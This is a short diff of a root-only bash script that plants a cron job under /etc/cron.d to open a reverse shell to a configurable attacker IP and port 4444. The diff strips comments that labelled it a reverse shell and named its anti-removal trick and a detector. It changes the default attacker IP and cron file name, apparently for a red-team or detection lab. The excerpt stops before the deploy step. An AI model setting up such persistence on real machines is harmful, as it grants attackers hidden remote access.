@@ -1,13 +1,10 @@
 #!/usr/bin/env bash
-# Cron reverse shell firing every 2 minutes.
-# chattr +i on the cron file blocks rm-based remediation.
-# Detected by: defender-cli anti-persistence --cron-system
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
-ATTACKER_IP="${ATTACKER_IP:-172.25.21.1}"
+ATTACKER_IP="${ATTACKER_IP:-172.31.40.1}"
 ATTACKER_PORT="${ATTACKER_PORT:-4444}"
-CRON_FILE="/etc/cron.d/.sysaudit"
+CRON_FILE="/etc/cron.d/sysaudit"
 
 case "${1:-}" in
   deploy)
